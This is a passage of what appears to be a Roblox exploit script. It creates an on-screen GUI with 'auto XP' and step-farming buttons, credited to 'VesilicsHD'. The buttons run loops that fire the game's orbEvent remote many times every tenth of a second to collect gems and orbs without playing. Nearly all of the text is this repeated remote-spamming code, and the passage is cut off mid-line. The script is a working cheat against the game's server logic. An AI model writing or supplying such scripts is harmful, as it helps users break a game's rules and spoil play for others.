= "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) end
end)
tool:Button("（刷步数）",function()
        	--current user using the Gui-XxYouMetDeathXx

--This Gui Made By VesilicsHD--

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local AutoXP = Instance.new("TextButton")
local AutoRebirth = Instance.new("TextButton")
local Credits = Instance.new("TextLabel")
local Game = Instance.new("TextLabel")
--Properties:
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = ScreenGui
Main.Active = true
Main.BackgroundColor3 = Color3.new(0, 0, 0)
Main.BackgroundTransparency = 0.20000000298023
Main.Position = UDim2.new(0.385036498, 0, 0.133200794, 0)
Main.Size = UDim2.new(0, 395, 0, 271)
Main.Draggable = true

AutoXP.Name = "刷级"
AutoXP.Parent = Main
AutoXP.BackgroundColor3 = Color3.new(0, 0, 0)
AutoXP.Position = UDim2.new(0.225957587, 0, 0.269300699, 0)
AutoXP.Size = UDim2.new(0, 200, 0, 50)
AutoXP.Font = Enum.Font.GothamSemibold
AutoXP.Text = "刷级"
AutoXP.TextColor3 = Color3.new(1, 1, 1)
AutoXP.TextScaled = true
AutoXP.TextSize = 24
AutoXP.TextWrapped = true
AutoXP.MouseButton1Down:connect(function()
while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue 